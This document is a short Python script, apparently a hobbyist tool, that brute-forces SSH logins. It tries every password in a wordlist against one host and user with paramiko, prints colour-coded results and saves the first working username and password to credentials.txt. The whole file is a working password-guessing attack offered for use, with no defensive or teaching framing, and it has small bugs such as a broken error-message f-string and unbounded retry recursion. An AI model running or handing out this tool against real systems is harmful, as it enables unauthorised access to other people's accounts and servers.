import paramiko
import socket
import time
from colorama import init, Fore
import argparse

init()
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
reset = Fore.RESET

def ssh_connected(host,user,pwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            username=user,
            password=pwd,
            timeout=1,
            auth_timeout=1,
            banner_timeout=1
            )
    except socket.timeout:
        print(f"{red}[-]Host:{host} is unreachable.Time out.{reset}")
        time.sleep(0.05)
        return False
    except paramiko.AuthenticationException:
        print(f"{red}[-]Invad Credentials for host: {host} user:{user} pass: {pwd} {reset}")
    except paramiko.SSHException:
        print(f"{blue}[*]Retrying{reset}")
        time.sleep(20)
        return ssh_connected(host,user,pwd)
    except Exception as e:
        print('unforseen errer : {e}')
    else:
        print(f"{green}[+]Found host : {host} \n\t username : {user} \n\tpassword : {pwd}{reset}")
        return True
    
def passlist_resolver(passlist):
    with open(passlist,'r') as f:
        for line in f:
            yield line.strip()

if __name__=="__main__":
    parser = argparse.ArgumentParser(description = "ssh bruteforcer")
    parser.add_argument('host',help="Hostname")
    parser.add_argument('-p','--passlist',help="password wortdlist")
    parser.add_argument('-u','--user',help="username")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    passes = passlist_resolver(passlist)
    for password in passes:
        if ssh_connected(host,user,password):
            open('credentials.txt','w').write(f'{user}@{host}:{password}')
            break
